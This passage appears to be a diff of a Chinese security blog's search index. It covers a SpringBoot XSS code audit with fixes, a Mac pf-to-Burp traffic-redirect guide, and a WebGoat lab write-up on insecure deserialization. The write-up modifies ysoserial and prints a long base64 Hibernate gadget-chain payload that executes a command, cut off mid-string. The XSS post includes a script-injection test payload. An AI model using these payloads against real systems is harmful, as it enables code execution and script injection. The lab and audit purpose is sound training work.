 <p><a href="https://segmentfault.com/a/1190000004617028" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004617028</a></p>
 <p><a href="https://c0d3p1ut0s.github.io/MyBatis框架中常见的SQL注入/" target="_blank" rel="noopener">https://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计四 - XSS</title>
-    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
-    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
-<a id="more"></a>
-
-<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
-<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
-<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
-<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
-<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">
-
-
-
-<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
-<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
-<p>可以判断该应用程序中很可能存在XSS。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">
-
-
-
-<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
-<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
-<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
-<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
-<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
-<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
-<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">
-
-<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
-<ol>
-<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
-</ol>
-<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
-<ol start="2">
-<li>找不经过thymeleaf的输出</li>
-</ol>
-<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
-<p>发现触发我们输入的XSS payload</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
-<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
-<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
-<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
-<ol>
-<li>对HTML做充分转义</li>
-</ol>
-<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如 <a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
-<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
-<p>修复过程中得结合考虑实际的业务场景。</p>
-<ol start="2">
-<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
-</ol>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
-<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
-<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">   <span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    http</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      .headers()</span><br><span class="line">        .addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
-<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
-<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
-<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -758,44 +887,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
-    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
-    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
-<a id="more"></a>
-
-<p>使用步骤：</p>
-<ol>
-<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
-<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
-
-<ol start="3">
-<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
-</li>
-<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
-
-
-
-<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
-<p><code>sudo pfctl -d</code>关闭packet filter</p>
-<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计六 - CSRF</title>
     <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
     <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
@@ -847,6 +938,44 @@
 <p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
 <p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
 <p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
+    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
+    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
+<a id="more"></a>
+
+<p>使用步骤：</p>
+<ol>
+<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
+<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
+
+<ol start="3">
+<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
+</li>
+<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
+
+
+
+<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
+<p><code>sudo pfctl -d</code>关闭packet filter</p>
+<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
 ]]></content>
   </entry>
   <entry>
@@ -977,6 +1106,77 @@
 <p><code>cd /usr/local/soft/tomcat/</code>就到了tomcat目录，其中<code>conf</code>目录就是配置文件所在的目录，需要更改的<code>server.xml</code>就在该路径下</p>
 <p><img src="/2019/12/26/Tomcat8.5+_400_hide/tomcat-conf-path.png" alt="tomcat-conf-path"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>WebGoat - 不安全的反序列化</title>
+    <url>/2019/09/28/WebGoat-Deserialization/</url>
+    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
+<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
+<p>最早的一篇讲解Webgoat反序列化的文章</p>
+<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
+<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
+<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
+<p>另一篇文章</p>
+<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
+<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
+<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
+<p>然后将请求Send request to DS - Exploitation</p>
+<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
+<p>详细报错信息如下所示</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
+<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
+<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
+<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
+<blockquote>
+<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
+</blockquote>
+<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
+<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
+<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
+<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
+<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
+<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
+<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
+<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
+<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>最终效果图如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
+<p>payload也贴一下吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQA